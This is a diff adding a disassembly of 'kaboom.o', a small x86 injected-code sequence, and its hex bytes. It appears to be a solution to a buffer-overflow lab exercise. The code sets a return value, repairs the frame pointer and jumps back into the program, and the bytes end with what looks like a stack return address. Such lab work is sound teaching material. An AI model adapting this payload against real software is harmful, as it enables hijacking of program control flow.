@@ -1,0 +1,24 @@
+
+kaboom.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 06 7f 8a 5d       	mov    $0x5d8a7f06,%eax
+   5:	89 e5                	mov    %esp,%ebp
+   7:	81 c5 48 02 00 00    	add    $0x248,%ebp
+   d:	83 c5 18             	add    $0x18,%ebp
+  10:	b9 01 95 04 08       	mov    $0x8049501,%ecx
+  15:	51                   	push   %ecx
+  16:	c3                   	ret    
+
+
+b8 06 7f 8a 5d
+89 e5
+81 c5 48 02 00 00
+83 c5 18
+b9 01 95 04 08
+51
+c3
+b8 38 68 55
